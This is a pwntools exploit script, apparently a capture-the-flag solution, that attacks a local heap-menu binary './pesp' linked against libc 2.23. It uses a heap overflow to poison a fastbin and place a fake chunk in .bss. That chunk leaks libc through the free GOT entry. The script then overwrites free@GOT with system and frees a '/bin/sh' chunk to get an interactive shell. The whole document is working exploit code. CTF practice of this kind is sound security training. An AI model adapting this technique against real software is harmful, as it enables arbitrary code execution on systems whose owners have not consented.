from pwn import*

libc = ELF("./libc-2.23.so")
io = process("./pesp")

def show():
    io.sendlineafter("choice:","1")

def add(size,content):
    io.sendlineafter("Your choice:","2")
    io.sendlineafter("servant name:",str(size))
    io.sendafter(":",content)
    sleep(0.01)

def change(idx,size,content):
    io.sendlineafter("Your choice:","3")
    io.sendlineafter(":",str(idx))
    io.sendlineafter(":",str(size))
    io.sendlineafter(":",content)

def remove(idx):
    io.sendlineafter("Your choice:","4")
    io.sendlineafter(":",(str(idx)))

bss = 0x6020ad
free_got_addr = 0x602018

add(0x60,"\x00"*0x60) #chunk0
add(0x60,"\x11"*0x60) #chunk1
add(0x60,'/bin/sh\x00') #chunk2 binsh

remove(1)
change(0,0x100,flat("\x00"*0x60,p64(0),p64(0x71),p64(bss)))#chunk0_overflow
add(0x60,"\x11"*0x60)#get chunk1
add(0x60,flat("\x00"*0x3,p64(0x100),p64(free_got_addr)))#get fakechunk
show()
io.recvuntil("0 : ")

libc_base = u64(io.recv(6).ljust(8,'\x00')) - libc.sym['free']

log.info("libc_base:%x"%libc_base)
system_libc = libc_base + libc.sym['system']
puts = libc_base + libc.sym['puts']

change(0,0x100,flat(p64(system_libc,),p64(puts)))

remove(2)

io.interactive()

